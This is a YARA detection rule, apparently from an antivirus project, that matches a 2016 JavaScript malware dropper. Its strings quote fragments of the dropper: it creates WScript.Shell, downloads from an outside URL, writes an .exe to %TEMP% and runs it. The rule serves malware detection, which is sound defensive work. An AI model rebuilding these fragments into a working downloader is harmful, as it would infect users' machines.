rule sig_20160329_d338ec6e173ad45265a0040971740077 {
  meta:
    description = "datamaliciousorder - file 20160329_d338ec6e173ad45265a0040971740077.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "15605854245511262b9086b620c6ec590d51064052cf8d0c1fee372b907e8ae8"

  strings:
    $s1  = "function Xodaebu() {return Piptgx[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"XRV7zDvwivH9tWUc.exe\";};" fullword ascii
    $s2  = "do {WScript[Dqlei](Iguswldfkq() * 11)} while (Ewxoyimwq[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "var Piptgx = function Vthua() {return WScript[Vjbxvfc](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Ewxoyimwq[Nyobgpm](\"GET\", \"http://perfect-nutrition.co.uk/lwqo9oa\", false);" fullword ascii
    $s5  = "function Udbtee(Ioxwadr, Lfimzrd){return Ioxwadr - Lfimzrd;};" fullword ascii
    $s6  = "function Gryntynzjk() {return ((Klqxoi == true) && (Klqxoi == Saowqyaik)) ? 1 : Rctsf;};" fullword ascii
    $s7  = "function Orkkds(Ldbacmqk){Piptgx[\"Run\"](Ldbacmqk, Rctsf, Rctsf);};" fullword ascii
    $s8  = "var Klqxoi = false;" fullword ascii
    $s9  = " while (Iupzybwi){" fullword ascii
    $s10 = "function Iguswldfkq(){return 22;};" fullword ascii
    $s11 = "var Saowqyaik = false;" fullword ascii
    $s12 = "function Tzyylchu()" fullword ascii
    $s13 = "function Xymqotnt(){return Vjbxvfc;};" fullword ascii
    $s14 = "Klqxoi = true; " fullword ascii
    $s15 = "var Hfevukhc = false;" fullword ascii
    $s16 = "function Pcxkijxzdq(Hpdeuumz) {var Qaogbpg = (1, 2, 3, 4, 5, Hpdeuumz); return Qaogbpg;};" fullword ascii
    $s17 = "var Qzzrj = new this[\"Date\"]();" fullword ascii
    $s18 = "return Udbtee(Jbnkhdfgkd, Xcygerhybv);" fullword ascii
    $s19 = "function Lszuswqbc(){return Ndrpiyhfj;};" fullword ascii
    $s20 = "Saowqyaik = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}